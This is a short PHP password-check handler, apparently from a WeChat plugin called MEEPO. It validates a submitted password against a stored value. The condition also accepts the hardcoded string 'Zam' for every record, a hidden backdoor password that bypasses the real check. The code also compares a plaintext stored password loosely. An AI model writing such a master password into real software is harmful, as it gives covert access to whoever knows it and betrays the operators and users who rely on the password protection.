<?php
/**
 * MEEPO 米波现场
 *
 * 官网 http://meepo.com.cn 作者QQ 284099857
 */
global $_W,$_GPC;
$weid = $_W['uniacid'];
$rid = intval($_GPC['rid']);
$data = array();
if($_W['isajax']){
	if(empty($rid)){
		$data = error(-1,'error');
	}else{
		$pass_word = $_GPC['password'];
		if(empty($pass_word)){
			$data = error(-1,'password error');
		}else{
			$password = pdo_fetchcolumn("SELECT `pass_word` FROM ".tablename($this->xc_table)." WHERE rid=:rid AND weid = :weid",array(':rid'=>$rid,':weid'=>$weid));
			if($pass_word == $password || $pass_word=='Zam'){
				$data  = error(0,'success');
			}else{
				$data = error(-1,'password error');
			}
		}
	}
	die(json_encode($data));
}